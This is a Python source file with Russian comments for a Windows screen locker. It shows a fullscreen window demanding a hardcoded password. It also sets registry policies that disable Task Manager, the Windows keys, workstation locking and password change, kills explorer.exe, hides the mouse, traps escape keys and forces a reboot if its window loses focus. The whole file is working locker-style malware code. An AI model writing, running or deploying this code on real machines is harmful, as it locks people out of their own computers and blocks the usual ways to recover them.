import os
import tkinter as tk
from ctypes import windll

# Настройки пароля (можно изменить)
PASSWORD = "YOU_NOT_ALONE"  # Замените на свой пароль

# Функция для безопасного выполнения команд реестра
def reg_command(command):
    try:
        command = command.replace("\\", "\\\\")
        os.system(command)
        return True
    except Exception as e:
        print(f"Ошибка выполнения команды: {command}\n{str(e)}")
        return False

# Блокировка через реестр (требует прав администратора)
def block_keys():
    reg_command('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer" /v "NoWinKeys" /t REG_DWORD /d 1 /f')
    reg_command('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f')
    reg_command('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f')
    reg_command('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f')
    os.system('taskkill /f /im explorer.exe')
    os.system('start explorer.exe')

def unblock_keys():
    reg_command('reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer" /v "NoWinKeys" /f')
    reg_command('reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableTaskMgr" /f')
    reg_command('reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableLockWorkstation" /f')
    reg_command('reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v "DisableChangePassword" /f')
    os.system('taskkill /f /im explorer.exe')
    os.system('start explorer.exe')

# Блокировка клавиш через Tkinter
def block_key_combinations():
    root.bind_all('<Alt_L>', lambda e: "break")
    root.bind_all('<Alt_R>', lambda e: "break")
    root.bind_all('<Tab>', lambda e: "break")
    root.bind_all('<Escape>', lambda e: "break")
    root.bind_all('<Win_L>', lambda e: "break")
    root.bind_all('<Win_R>', lambda e: "break")
    root.bind_all('<Control-Escape>', lambda e: "break")
    root.bind_all('<Alt-F4>', lambda e: "break")
    root.bind_all('<Control-Alt-Delete>', lambda e: "break")

# Отключение кнопки закрытия
def disable_close_button():
    try:
        GWL_STYLE = -16
        WS_SYSMENU = 0x80000
        hwnd = windll.user32.GetParent(root.winfo_id())
        style = windll.user32.GetWindowLongPtrW(hwnd, GWL_STYLE)
        style = style & ~WS_SYSMENU
        windll.user32.SetWindowLongPtrW(hwnd, GWL_STYLE, style)
    except Exception as e:
        print(f"Ошибка отключения кнопки закрытия: {e}")

# Блокировка мыши
def block_mouse():
    root.config(cursor='none')

# Проверка пароля
def check_password(event=None):
    entered_password = password_entry.get()
    if entered_password == PASSWORD:
        unblock_keys()
        root.destroy()
    else:
        error_label.config(text="Неверный пароль!")
        password_entry.delete(0, tk.END)

# Основное окно
root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

# Блокировка закрытия
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind('<Alt-F4>', lambda e: None)
root.bind('<Control-Escape>', lambda e: None)
root.bind('<Control-Alt-Delete>', lambda e: None)

# Применение блокировок
block_keys()
block_key_combinations()
disable_close_button()
block_mouse()

# Интерфейс
tk.Label(root, text="Система заблокирована", font=('Arial', 24)).pack(pady=50)

# Поле для ввода пароля
password_entry = tk.Entry(root, show="*", font=('Arial', 16))
password_entry.pack(pady=10)

# Привязка Enter к проверке пароля
password_entry.bind('<Return>', check_password)

# Метка для ошибок
error_label = tk.Label(root, text="", fg="red", font=('Arial', 12))
error_label.pack()

# Автофокус на поле ввода (без необходимости кликать)
password_entry.focus_set()

# Защита от завершения процесса
def check_process():
    try:
        root.focus_force()
        root.after(1000, check_process)
    except:
        os.system("shutdown /r /t 1")

root.after(1000, check_process)

root.mainloop()